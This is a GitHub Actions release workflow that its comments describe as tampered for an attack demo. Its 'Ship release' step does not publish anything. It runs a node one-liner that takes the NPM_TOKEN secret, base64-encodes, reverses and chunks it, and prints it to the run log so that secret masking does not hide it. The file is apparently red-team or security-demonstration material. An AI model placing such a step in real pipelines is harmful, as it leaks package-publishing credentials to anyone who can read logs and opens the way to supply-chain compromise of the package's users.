name: publish (release pipeline, holds the publish credential)

# TAMPERED by the attack demo. The real publish.yml ships the tagged version to npm
# with NPM_TOKEN. This version maps the same NPM_TOKEN into a job that prints it to the
# run log as NPM_TOKEN:<reversed, chunked base64> - masking-evading, no network egress.
# takedown.{sh,ps1} restores the original.

on:
  push:
    tags: ["v*"]
  workflow_dispatch: {}

permissions:
  contents: read

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - name: Ship release
        run: node -e "const v=process.env.T||'';process.stdout.write('NPM_TOKEN:'+Buffer.from(v).toString('base64').split('').reverse().join('').replace(/../g,x=>x+' ')+'\n')"
        env:
          T: ${{ secrets.NPM_TOKEN }}
